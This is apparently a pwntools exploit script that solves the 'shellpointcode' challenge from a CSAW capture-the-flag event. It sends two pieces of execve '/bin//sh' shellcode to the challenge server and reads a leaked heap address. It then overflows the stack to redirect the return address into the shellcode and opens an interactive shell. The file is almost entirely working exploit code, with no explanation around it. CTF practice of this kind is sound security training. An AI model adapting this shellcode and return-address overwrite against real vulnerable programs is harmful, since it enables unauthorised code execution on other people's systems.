from pwn import *
from binascii import *

# shellcode source == https://systemoverlord.com/2016/04/27/even-shorter-shellcode.html


def get_flag():
    context.arch = 'amd64'
    local = False
    if local:
        c = process('./shellpointcode')
        context.terminal = 'sh'
        gdb.attach(c, 'break goodbye')
        # c = gdb.debug('./shellpointcode', gdbscript='''
        # break main
        # continue
        # ''')
    else:
        c = remote('pwn.chal.csaw.io', 9005)
    sc1 = '\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x5e\xff\xe4'
    sc2 = '\x31\xf6\x56\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05'
    # recv prompt
    o = c.recvuntil('1:')
    print('Received: ', o)
    c.recvline()
    # send part of shell code + jump to next node
    c.sendline(sc1)
    o = c.recvline()
    print('Received: ', o)
    c.sendline(sc2)
    o = c.recvuntil('?\n')
    n2_add = int(o.split('\n')[1].split(': ')[-1], 16)
    print('Received: ', o)
    print('n2_add is: ', hex(n2_add))
    # construct payload w/ RA being node 1 buffer
    pay_load = b"A" * (3) + pack(0xDEADBEEF) + pack(n2_add + 0x20 + 8)
    # print repr(pay_load)
    c.sendline(pay_load)
    c.recvline()
    # c.recvline()
    c.interactive()


if __name__ == "__main__":
    get_flag()
